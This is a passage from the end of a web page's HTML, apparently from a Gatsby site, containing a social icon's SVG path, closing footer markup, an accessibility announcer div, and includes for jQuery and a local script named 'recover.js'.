                                                    d="M20.399 8.89a7.12 7.12 0 00-1.924-.292c-.781 0-2.464.498-2.464 1.463v2.311h3.997v3.891h-3.997V27h-4.027V16.263H10v-3.89h1.984v-1.96C11.984 7.456 13.366 5 16.702 5c1.142 0 3.186.059 4.298.439l-.601 3.452z">
                                                </path>
                                            </svg></a></div>
                                </div>
                            </div>
                        </div>
                    </footer>
                </main>
            </div>
        </div>
        <div id="gatsby-announcer"
            style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0"
            aria-live="assertive" aria-atomic="true"></div>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="assets/js/recover.js"></script>
</body>

</html>